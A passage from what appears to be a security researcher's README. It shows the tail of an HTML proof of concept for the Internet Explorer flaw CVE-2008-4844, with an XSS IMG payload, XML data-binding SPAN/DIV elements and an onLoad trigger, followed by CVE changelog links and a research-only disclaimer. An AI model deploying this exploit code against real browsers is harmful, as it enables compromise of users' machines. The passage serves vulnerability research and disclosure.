		"&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;" +
		"</C>" +
		"</X>" +
		"</XML>" +
		"<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>" +
		"<DIV DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>" +
		"</DIV>" +
		"</SPAN>";
}
</SCRIPT>
<BODY onLoad="Inception();">
<DIV ID="b00m" STYLE="display: none;">
</DIV>
</BODY>
</HTML>
```
Researchers know how hard is to change vulnerabilities description, and I really apreciate the changes...

Here is the [CVE Change Logs](https://cassandra.cerias.purdue.edu/CVE_changes/), and here is the [CVE Change Log](https://cassandra.cerias.purdue.edu/CVE_changes/CVE.2011.12.html) for modified [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) entry ([December 21, 2011](https://cassandra.cerias.purdue.edu/CVE_changes/CVE.2011.12.html)).

For further information, please, refer to this [link](https://github.com/nbrito/research/tree/master/pop/html/ips-bypass-test-bed).

## Credits
[Nelson Brito](mailto:nbrito@sekure.org)

## Disclaimer
Codes are available for research purposes only, and I vehemently deny the malicious use, as well as the illegal purpose use, of any information, code and/or tool contained on this repository.

If you think there is any information, code and/or tool that should not be here, please, [let me know](mailto:nbrito@sekure.org).

## Warning
This repository does not provide you with any legal rights to any intellectual property in any information, code and/or tool, also, be aware that the use of some information, code and/or tool may be forbidden in some countries, and there may be rules and laws prohibiting any unauthorized user from use the information, code and/or tool, being these actions considered illegal.
